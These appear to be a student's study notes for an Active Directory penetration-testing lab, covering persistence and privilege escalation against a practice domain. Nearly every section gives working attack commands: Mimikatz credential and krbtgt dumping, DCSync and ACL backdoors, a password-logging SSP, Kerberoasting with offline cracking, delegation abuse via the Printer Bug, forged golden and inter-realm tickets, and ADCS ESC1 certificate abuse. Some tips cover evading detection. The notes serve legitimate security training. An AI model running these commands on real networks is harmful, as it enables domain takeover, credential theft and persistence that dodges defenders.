There is a local admin on every DC called "Administrator" whose password is the DSRM (Directory Services Restore Mode) password. DSRM password (SafeModePassword) is required when a server is promoted to DC and its rarely changed. After altering the configuration on the DC, it is possible to pass the NTLM hash of the user to access the DC
- #### ***Dump DRSM password (needs DA privs)***
`Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc`
- #### ***Compare the Administrator hash with the Administrator hash of the below command***
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc`
(First one is the DSRM local administrator)
Since it is the local administrator of the DC, we can pass the hash to authenticate. But the Logon Behaviour for the DSRM account needs to be changed before we can use its hash
***NOISY - because it changes registry, easy to detect***
`Enter-PSSession -ComputerName dcorp-dc`
`New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`
- #### ***Use below command to pass the hash***
`Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<NTLMhash> /run:powershell.exe"'` `ls \\dcorp-dc\C$`
# **Learning Objective 11**
[[Learning Objective 11]]
# **Persistence - Custom SSP**
SSP (Security Support Provider) is a DLL which provides ways for an application to obtain an authenticated connection. SSP Packages by MS: NTLM, Kerberos, Wdigest, CredSSP
Mimikatz provides a custom SSP - mimilib.dll, that logs local logons, service account and machine account passwords in clear text on the target server
- #### ***1 of 2 ways, drop the mimilib.dll to system32 and add mimilib.dll to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages***
```powershell
$packages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```
- #### ***2 of 2 ways, using mimikatz to inject into lsass (not super stable with Server 2019 and Server 2022 but still usable)***
`Invoke-Mimikatz -Command '"misc::memssp"'`
(all local logons on the DC are logged to `C:\Windows\System32\mimilsa.log`)
# **Persistence using ACLs - AdminSDHolder**
Resides in the System container of a domain an used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups). Security Descriptor propagator (SDPROP) runs every hour and compares the ACL of protected groups (DAs, EAs, DCs, Schema admins, Administrators, etc) and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL
Well known abuse of some of the Protected Groups - can log on locally to DC

| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within these groups          |
| ----------------- | ----------------------------------------------------------------------------------- |
| Backup Operators  | Backup GPO, edit to add SID of controlled account to a privilegeg group and Restore |
| Server Operators  | Run a command as system (using the disabled Browser service)                        |
| Print Operators   | Copy ntds.dit backup, load device drivers                                           |
# **Persistence using ACLs - Rights Abuse**
Only need the "Replicating Directory Changes" and "Replicating Directory Changes All" permission on the Domain to be able to run DCSync
`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"`
- #### ***Add FullControl rights***
`Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentX -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`
- #### ***Using ActiveDirectory Module and RACE***
`Set-ADACL -SamAccountName studentuserx -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose`
- #### ***Add DCSync rights***
`Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentX -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`
- #### ***Using ActiveDirectory Module and RACE***
`Set-ADACL -SamAccountName studentuserx -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose`
- #### ***Execute DCSync***
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`
`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"`
# **Learning Objective 12**
[[Learning Objective 12]]
# **Persistence using ACLs - Security Descriptors**
It is possible to modify Security Descriptors (security information like Owner, primary group, DACL, SACL) of multiple remote access methods (securable objects) to allow access to non-admin users. Admin privs are required. 
`. C:\AD\Tools\RACE.ps1` (load RACE toolkit)
Make studentx to be able to PSRemote
`Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc -Verbose`
Make studentx able to get machine account hashes
`Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee studentx -Verbose`
Retrieve machine account hashes to do Silver Attack
`Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose`
# **Learning Objective 13**
[[Learning Objective 13]]
# **Privilege Escalation - Kerberoast**
offline cracking of service account passwords, (Step 4) the Kerberos session ticket (TGS) which is encrypted with the target service account secrets, this makes it possible to request a ticket and save it and do offline brute force. Because (non-machine) service account passwords are not frequently changed, this has become a very popular attack.
Most of the interesting services use machine account as service account (machine account passwords aren't easy to brute force). We want user accounts that are treated as service accounts (only need SPN attribute)
- #### ***Find user accounts used as Service accounts***
`Get-DomainUser -SPN` (PowerView)
`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincialName` (AD Module)
(Find kerberoastable users)
AES has salt, so we have to request a Service Ticket encrypted with NTLM hash (RC4), 
- #### ***Use Rubeus to list Kerberoastable stats***
`Rubeus.exe kerberoast /stats`
- #### ***Use Rubeus to list Kerberoastable stats***
`Rubeus.exe kerberoast /user:svcadmin /simple`
- #### ***To avoid detections based on Encryption Downgrade for Kerberos EType (used by the likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC***
`Rubeus.exe kerberoast /stats /rc4opsec`
`Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec`
- #### ***Kerberoast all possible account***
***not recommended, too much traffic, too easy to detect***
`Rubeus.exe kerberoast /rc4opsec /outfile:C:\AD\Tools\hashes.txt`
- #### ***Crack ticket using JTR***
`john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt`
# **Learning Objective 14**
[[Learning Objective 14]]
# **Privilege Escalation - Targeted Kerberoasting**
If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enable i.e Kerberos preauth is disabled, it is possible to grab users's crackable AS-REP and brute force it offline. With sufficient rights (GenericWrite and GenericAll), Kerberos preauth can be forced disabled as well
- #### ***Enumerating accounts with Kerberos preauth required***
`Get-DomainUser -PreAuthNotRequired -Verbose` (PowerView)
`Get-ADUser -Filter {DoesNotRequirePreAuth -eq "$True"} -Properties DoesNotRequirePreAuth` (AD Module)
- #### ***Request encrypted AS-REP for offline brute force using ASREPRoast***
`Get-ASREPHash -UserName VPNUser1 -Verbose`
- #### ***Enumerate all users with Kerberos preauth disabled and request a hash***
`Invoke-ASREPRoast -Verbose`
- #### ***Using JTR to brute force the hashes offline***
`john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt`
With enough rights (GenericAll/GenericWrite), a target users's SPN can be set to anything (unique in the domain). We can then request a TGS without special privileges, the TGS can then be "Kerberoasted" 
- #### ***Enumerate the permissions for RDPUsers on ACLs using PowerView***
`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
- #### ***Checking if the user already has an SPN***
`Get-DomainUser -Identity supportuser | select serviceprincipalname` (PowerView)
`Get-ADUser -Identity supportuser -Properties ServicePrincipalName | ServicePrincipalName` (AD Module)
- #### ***Set SPN for the user (must be unique for the forest)***
`Set-DomainObject -Identity support1user -Set @{serviceprincipalname='dcorp\whatever1'}` (PowerView)
`Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='dcorp\whatever1'}` (AD Module)
- #### ***Kerberoast the user***
`Rubeus.exe kerberoast /outfile:targetedhashes.txt`
`john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt`
# **Privilege Escalation - Kerberos Delegation**
Kerberos Delegation allows to "reuse the end-user credentials to access resources hosted on a different server". Typically usefult in multi-tier service or applications where Kerberos Double Hop is required. For example, users authenticate to a web server and web server makes requests to a database server. The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server's service account.
1. User provides credentials to the DC
2. DC returns a TGT
3. User requests a TGS for the web service on the web server
4. DC provides a TGS
5. User sends TGT inside of TGS to the web server
6. Web server decrypts the TGS (because it has its own secrets which were used to encrypt the TGS) and the web service now has the user's TGT. So the web server service account uses the user's TGT to request a TGS for the database server from the DC
7. web server service account connects to the database server as the user
#### ***2 types of Kerberos Delegation***
In both types of delegations, a mechanism is required to impersonate the incoming user and authenticate to the second hop server (DB server in our example)
	1. General/Basic or Unconstrained Delegation, which allows the first hop server (web server in our example) to request access to any service on any computer in the domain
	2. Constrained Delegation, which allows the first hop server (web server in our example) to request access only to specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first hop server, Windows offers Protocol Transition to transition the request to Kerberos.
When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user. When unconstrained delegation is enabled, the DC places users's TGT inside TGS (step 4). When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user's TGT to access any other resource as the user. This could be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a DA connects to that machine.
# **Privilege Escalation - Unconstrained Delegation**
- #### ***Discover domain computers which have unconstrained delegation enabled***
`Get-DomainComputer -UnConstrained` (PowerView)
`Get-ADComputer -Filter {TrustedForDelegation -eq "$True"}` (AD Module)
`Get-ADUser -Filter {TrustedForDelegation -eq "$True"}` (AD Module)
Compromise the servers where Unconstrained Delegation is enabled, we must trick or wait for a domain admin to connect to a service on appsrv
- #### ***Run Mimikatz and export tickets***
`Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'`
- #### ***The DA ticket could be reused***
`Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'`
# **Privilege Escalation - Unconstrained Delegation - Printer Bug**
A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to a second machine of the domain user's choice. We can force dcorp-dc to connect to dcorp-appsrv by abusing the Printer bug
- #### ***1. Compromise the web server - appsrv***
start a cmd with admin privs, (we extracted multiple credentials from dcorp-adminsrv, including a the appadmin user), start a session as appadmin using OverPass-The-Hash
`C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:<AESkey> /run:cmd.exe" "exit"`
(in the new cmd, run InvisiShell)
check if appadmin has local admin privs on dcorp-appsrv
`. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
`Find-PSRemotingLocalAdminAccess -ComputerName dcorp-appsrv` (check to see that appadmin has local admin privs on dcorp-appsrv)
`exit`
`echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe /Y` (copy Rubeus.exe to dcorp-appsrv)
`winrs -r:dcorp-appsrv cmd` (connect to dcorp-appsrv)
- #### ***2. Make dcorp-dc connect to dcorp-appsrv***
`C:\Users\Public\Rubeus.exe monitor /interval:5 /targetuser:dcorp-dc$ /nowrap` (every 5 seconds it will check if there is a TGT for a DC account and we don't want a any new lines in the base64 encoded TGT)
On another normal cmd, Force dcorp-dc to connect to dcorp-appsrv abusing the Printer Bug
(Windows) - https://github.com/leechristensen/SpoolSample
`C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local`
(Linux) - https://github.com/p0dalirius/Coercer
Copy the base64 encoded TGT, remote extra spaces if there are and use it
`Rubeus.exe ptt /ticket:<paste base64 encoded ticket>`
One the ticket is injected, run DCSync
`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"`
# **Learning Objective 15**
[[Learning Objective 15]]
# **Privilege Escalation - Constrained Delegation with Protocol Transition**
When enabled on a service account, allows access only to specified services on specified computers as a user. A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization. To impersonate the user, Service for User (S4U) extension is used which provides 2 extensions:
-  Service for User to Self (S4U2self) - Allows a service to obtain a forwardable TGS to itself on behalf of a user
- Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user
1. A user authenticates to the web service (running with service account websvc) using a non-kerberos compatible authentication mechanism
2. The web service requests a ticket from KDC for the user's account without supplying a password, as the websvc account
3. The KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that the user's account is not blocked for delegation. If OK it returns a forwardable ticket for the user's account (S4U2Self)
4. The service then passes this ticket back to the KDC and requests a TGS for the CIFS/dcorp-mssql.dollarcorp.moneycorp.local service
5. The KDC checks the msDS-AllowedToDelegateTo field on the websvc account. If the service is listed it will return a TGS for dcorp-mssql (S4U2Proxy)
6. The web service can now authenticate to the CIFS on dcorp-mssql as the user using the supplied TGS
The problem is in Step 2 because the DC never knows if the user whom ticket is requested actually ever authenticated to the web server or not (so we don't need to force DC to connect to the web server), so we could request a ticket for DA and all DC would check is if the account is blocked for delegation or not and if delegation is enabled on the web server. 
- #### ***Enumerate users and computers with constrained delegation enabled***
`Get-DomainUser -TrustedToAuth` (PowerView)
`Get-DomainComputer -TrustedToAuth` (PowerView)
`Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo` (AD Module)
We could see that if we compromise the account websvc we would be able to access the file system on dcorp-mssql (`{CIFS/dcorp-mssql.dollarcorp.moneycorp.local}`) as any user including DA
we have extracted credentials from dcorp-adminsrv which included credentials of websvc as well
- #### ***1st Abuse - Use websvc credentials to access CIFS on dcorp-mssql as DA***
(either plaintext pasword or NTLM hash/AES keys is required, we already have access to websvc's hash from dcorp-adminsrv)
- ##### ***Abusing with Kekeo***
- ##### ***Using asktgt from Kekeo, we request a TGT (steps 2&3)***
`tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:<RC4key>`
- ##### ***Using s4u from Kekeo, we request a TGS (steps 4&5)***
`tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL`
- ##### ***Abusing with Mimikatz - Injecting the ticket***
`Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'`
`ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$`
- ##### ***Abusing with Rubeus - Request a TGT and TGS in only one command***
`C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:<AESkey> /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt`
`ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$`
- #### ***2nd Abuse - Change service***
`Get-DomainComputer -TrustedToAuth` (enumerate computers for constrained delegation)
(we could see that the dcorp-adminsrv has constrained delegation configured on service `{TIME/dcorp-dc.dollarcorp.moneycorp.local}`)
open cmd with local admin privs
(either plaintext pasword or NTLM hash/AES keys is required, we already have access to websvc's hash from dcorp-adminsrv)
- ##### ***Abusing with Kekeo***
- ##### ***Using asktgt from Kekeo, we request a TGT***
`tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:<RC4key>`
- ##### ***Using s4u from Kekeo_one, (no SNAME validation)***
`tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL`
- ##### ***Abusing with Mimikatz - Injecting the ticket***
`Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'`
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`
- ##### ***Abusing with Rubeus - Request a TGT and TGS in only one command***
`C:\AD\Tools\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<AESkey> /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt` (abusing dcorp-adminsrv account, impersonating Administrator and we request a TGS for time service but we are changing the service from time to ldap)
`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"` (run DCSync attack)
# **Learning Objective 16**
[[Learning Objective 16]]
# **Privilege Escalation - Resource-Based Constrained Delegation**
RBCD - Resource-Based Constrained Delegation
Moves Delegation authority to the resource/service administrator.
Instead of SPNs on msDS-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service. That is, the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to DAs
- To abuse RBDC in the most effective form, we just need two privileges:
	1. Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity
	2. Control over an object which has SPN configured (like admin access to domain joined machine or ability to join a machine to domain - ms-DS-MachineAccountQuota is 10 for all domain user)
We already have admin privs on student VMs that are domain joined machines, Enumeration would show that the user ciadmin has Write permissions over the dcorp-mgmt machine 
`Find-InterestingAcl | ?{$_.identityreferencename -match 'ciadmin'}`
- #### ***Configure the RCBD on dcorp-mgmt for student machine***
`$comps = 'dcorp-student1$', 'dcorp-student2$'`
`Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps`
- #### ***Get the privileges of dcorp-studentx$ by extracting its AES keys***
`Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
(get jenkins reverse shell, bypass scriptblock logging and AMSI and load Powerview in memory)
`Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student1$'`
`Get-DomainRBDC` (check that dcorp-student1 machine is able to access any service on dcorp-mgmt as any user including DA)
(cmd with local admin privs),
`C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"` (we would need the AES keys of the username that has the SID of S-1-5-18)
(from a normal session on the student VM),
`C:\AD\Tools\Rubeus.exe s4u /user:dcorp-student1$ /aes256:<AESkeys> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt` (we want to access as dcorp-student and we would like to access HTTP on dcorp-mgmt as administrator)
`winrs -r:dcorp-mgmt cmd` (access dcorp-mgmt as DA, using winrs because he have a ticket using HTTP service)
# **Learning Objective 17**
[[Learning Objective 17]]
# **Privilege Escalation - Across Trusts**
### **Across Domains - Child to Parent using Trust Tickets**
Across Domains - Implicit two way trust relationship
sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory. sIDHistory can be abused in two ways of escalating privileges within a forest:
- krbtgt hash of the child
- Trust tickets - (additional step to the default kerberos flow, where this time there are 2 DCs which have Implicit Trust, in 1 DC it follows the flow of requesting a TGT/receiving a TGT/showing the TGT and requesting a TGS/receiving a inter-realm TGT (encrypted using the Trust Key, shared by both the DCs) , and then to the other DC it requests a TGS using that inter-realm TGT and we receive a TGS and as usual present the TGS to the Application Server)
(we are going to extract the trust key and then forge a inter-realm TGT where we inject a well known EA SID 519), 
- #### ***Look for [In] trust key from child to parent***
`Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc` or `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'` or 
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
- #### ***Forge an inter-realm TGT***
`C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<DomainSID> /sids:<SID of EA group of the parent domain> /rc4:<RC4hash> /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"` (within a forest or across forest AES is not supported)
- ##### ***Abusing with Kekeo***
- ##### ***Get a TGS for a service (CIFS) in the target domain by using the forged trust ticket***
`.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local`
- ##### ***Use the TGS to access the targeted service***
`.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi`
`ls \\mcorp-dc.moneycorp.local\c$`
(Tickets for other services, like HOST and RPCSS for WMI, HTTP for PSRemoting and Winrm can be created as well)
- ##### ***Abusing with Rubeus - Using the TGT forged inititally***
`C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt`
`ls \\mcorp-dc.moneycorp.local\c$`
# **Learning Objective 18**
[[Learning Objective 18]]
### **Across Domains - Child to Parent using krbtgt hash**
(Basically a Golden Ticket attack, except we forge a TGT for our own domain and include the sIDHistory)
We will abuse sIDHistory once again
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
`C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /sids:<SIDS> /krbtgt:<AESkey> /ptt" "exit"` (/sids option is forcefully setting the sIDHistory for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group, it will work because there is a trust relationship between the current DC and the parent DC)
- On any machine on the current domain
`Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'`
`ls \\mcorp-dc.moneycorp.local.kirbi\c$`
`gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local`
`C:AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:administrator /domain:moneycorp.local" "exit"`
- Avoid suspicious logs by using DC group
`C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /groups:516 /sids:<DC>,S-1-5-9 /krbtgt:<AESkey> /ptt" "exit"`
`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"`
S-1-5-21-2578538781-2508153159-3419410681-516 = DC
S-1-5-9 = Enterprise DC
# **Learning Objective 19**
[[Learning Objective 19]]
### **Across Forests**
Across Forests - Trust relationship needs to be established
(basically same flow as in across domain), can't escalate to EA because of SID Filtering, making it not possible to have a sIDHistory across the forest boundary, it will filter any SIDs in the tickets
(as DA),
`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\ecorp$" "exit"` (extracing the Trust Key shared between the dollarcorp DC and eurocorp DC, hash NTLM)
`C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /sids:<EAsid> /rc4:<hashNTLM> /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"` (forge inter-realm TGT across forest)
- ##### ***Abusing with Kekeo***
- ##### ***Get a TGS for a service (CIFS) in the target domain by using the forged trust ticket***
`.\asktgs.exe C:\AD\Tools\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local`
- ##### ***Use the TGS to access the targeted service***
`.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi`
`ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`
(Tickets for other services, like HOST and RPCSS for WMI, HTTP for PSRemoting and Winrm can be created as well)
- ##### ***Abusing with Rubeus - Using the TGT forged inititally***
`C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt` (request TGS using forget inter-realm TGT)
(It will filter the SID, but the ticket created would still be valid).
`dir \\eurocorp-dc.eurocorp.local\c$` (we wouln't be able to access)
`dir \\eurocorp-dc.moneycorp.local\SharedwithDCorp\` (but we can access if we try a explicitlty shared resource)
`klist purge` (purge all forged tickets)
(create the service ticket again, and it should work)
`net view \\eurocorp-dc.eurocorp.local` (enumerate shares in the domain)
# **Learning Objective 20**
[[Learning Objective 20]]
# **Privilege Escalation - Across Domain Trusts - ADCS**
ADCS - Active Directory Certificate Services, enables use of PKI (Public Key Infrastructure) in AD forest. ADCS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more. "ADCS is the Server Role that allows you to build a PKI and provide Public Key cryptography, digital certificates, and digital signatures capabilities for your organization".
CA - Certification Authority that issues certificates. The server with ADCS role (DC or separate is the CA).
Certificate - Issued to a user or machine and can be used for authentication, encryption, signing, etc
CSR - Certificate Signing Request made by a client to the CA to request a certificate.
Certificate Template - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiracy, etc
EKU OIDs - Extended Key Usages Object Identifier. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA, etc)
Ways of abusing ADCS: Extract user and machine certificates, Use certificates to retrieve NTLM hash, User and machine level persistence, Escalation to DA and EA, Domain Persistence
- #### ***Enumerate ADCS in the target forest***
We can use the Certify tool (https://github.com/GhostPack/Certify)
`Certify.exe cas`
- #### ***Enumerate the templates***
`Certify.exe find`
- #### ***Enumerate vulnerable templates***
`Certify.exe find /vulnerable`
In moneycorp, there are multiple configurations in ADCS. Common requirements/misconfigurations for all the Escalations that we have in the lab (ESC1): CA grants normal/low-privileged users enrollment rights; Manager approval is disabled; Authorization signatures are not required; The target template grants normal/low-privileged users enrollment rights
ESC1 - enrollee can request a certificate for any user
`C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject` (enumerate ESC1 vulnerable templates, look for Enrollment Rights)
- #### ***Exploit ESC1***
`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator` (request the enterprise CA to provide a certificate from HTTPSCertificates template, for the administrator user, DA of our current domain)
(copy and save as esc1.pem)
`openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx` (convert to PFX format to use the certificate with Rubeus, remember password used to encrypt)
`C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:C:\AD\Tools\esc1-DA.pfx /password:<password above> /ptt` (request TGT for DA)
`winrs -r:dcorp-dc cmd` (access DC)
`klist purge` (purge the ticket created to avoid fails)
`C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator` (request the enterprise CA to provide a certificate from HTTPSCertificates template, for the administrator user, DA of our current forest root)
(copy and save as esc1-EA.pem)
`openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx` (convert to PFX format to use the certificate with Rubeus, remember password used to encrypt)
`C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\AD\Tools\esc1-EA.pfx /password:<password above> /ptt` (request TGT for DA/EA of the forest root for the specified DC)
`winrs -r:mcorp-dc cmd` (access forest root DC)
# **Learning Objective 21**
[[Learning Objective 21]]
# **Trust Abuse - MSSQL Servers**
MSSQL server are generally deployed in plenty in a Windows domain. SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles. For MSSQL and PowerShell, lets use PowerUpSQL (https://github.com/NetSPI/PowerUpSQL)
- #### ***Discovery (SPN Scanning)***
`Get-SQLInstance`
- #### ***Check Accessibility***
`Get-SQLConnectionTestThreaded`
`Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose`
- #### ***Gather Information***
`Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
(start InvisiShell)
`Import-Module C:\AD\Tools\PowerUpSQL-master/PowerUpSQL.psd1` (import module)
`Get-SQLInstanceDomain` (Scan SPNs that start with MSSQL)
`Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose` (check if we have the privileges and the network connectivity to access the MSSQL Servers, see that we can only connect to dcorp-mssql)
`Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose` (see if we are able to extract information)
`logoff` (we were supposed to have some information returned)
### **DB Links**
Allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of DB links between SQL Servers, that is, linked SQL servers it is possible to execute stored procedures. DB Links work even across forest trusts
- #### ***Search DB Links***
`Get-SQLServerLink -Instance dcorp-mssql -Verbose` or `select * from master..sysservers`
(we can see that the dcorp-mssql instance has a link to dcorp-sql1 and that is_data_access_enabled is True), 
